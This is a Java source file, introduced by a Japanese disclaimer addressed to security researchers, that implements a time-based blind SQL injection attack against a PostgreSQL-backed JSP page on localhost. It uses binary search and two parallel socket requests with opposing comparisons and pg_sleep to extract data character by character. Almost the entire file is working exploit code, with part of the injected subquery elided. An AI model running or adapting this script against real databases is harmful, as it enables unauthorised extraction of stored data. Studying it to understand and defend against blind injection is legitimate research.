import java.util.concurrent.*;
import java.util.stream.IntStream;
import java.util.*;
import java.net.*;

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 

本プログラムで示す内容は日本国内のセキュリティ研究者が攻撃のリスクを正しく評価できるように
するための情報共有を目的に提供されます。

自身の管理下にないコンピュータ等に対しSQLインジェクションを実施する行為は場合によっては犯罪
行為となりますので絶対に行わないでください。

 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

public class noSleep
{
private final String host = "localhost";
private final int port = 8080;
private final String[] sqlArray1 = new String[] { "<", ">=" };

public static void main( String[] args ) throws Exception
{
	(new noSleep()).execute();
}

public void execute() throws Exception
{
	final long start = System.currentTimeMillis();
	final StringBuilder sb = new StringBuilder();
	for( int pos = 1;; ++pos )
	{
		int result = execute( pos );
		if( result == -1 )
		{
			break;
		}
		else
		{
			sb.append( ( char )result );
		}
	}
	p( "took:" + (System.currentTimeMillis() - start) );
	p( sb.toString() );
}

public int execute( final int pos )
{
	if( isLessThan( pos, 1 ) )
	{
		return -1;
	}
	int from = 32;
	int to = 126;

	while( from != to )
	{
		int target = (from + to) / 2;
		if( target == from )
		{
			target = to;
		}
		p( from + " / " + to );
		if( isLessThan( pos, target ) )
		{
			to = target - 1;
		}
		else
		{
			from = target;
		}
	}
	p( "==========" );
	p( pos + ":" + ( char )from );
	//p( to );		
	p( "==========" );

	return from;
}

private Socket getSocket() throws Exception
{
	return new Socket( host, port );
}

public boolean isLessThan( final int pos, final int target )
{
	try
	{
		final Socket[] socketArray = new Socket[] { getSocket(), getSocket() };
		final int[] result = IntStream.range( 0, 2 ).parallel().map( x -> search( x, pos, target, socketArray ) ).toArray();
		if( result[ 0 ] == -1 )
		{
			p( pos + ":not less than:" + target );
			return false;
		}
		else
		{
			p( pos + ":less than:" + target );
			return true;
		}
	}
	catch( Exception e )
	{
		e.printStackTrace();
		return true;
	}
}

public int search( final int threadIndex, final int pos, final int target, final Socket[] socketArray )
{
	String sql = "XXX' or (略) limit 1)," + pos + ",1))" + sqlArray1[ threadIndex ] + target + " or ( select pg_sleep(0.5) is null )--";
	final Socket socket = socketArray[ threadIndex ];
	int result = 1;
	try
	{
		socket.getOutputStream().write( ("GET /timebased/test1.jsp?id=" + URLEncoder.encode( sql, "US-ASCII" ) + " HTTP/1.1\r\nConnection: close\r\nHost: " + host + "\r\n\r\n").getBytes() );
		byte[] buf = new byte[ 100 ];
		while( true )
		{
			int read = socket.getInputStream().read( buf );
			if( read <= 0 )
			{
				break;
			}
		}
	}
	catch( Exception e )
	{
		//p( e );
		result = -1;
	}
	finally
	{
		try
		{
			socketArray[ 0 ].close();
			socketArray[ 1 ].close();
		}
		catch( Exception e )
		{
		}
	}
	return result;
}

public void p( Object o )
{
	System.out.println( o );
}

}
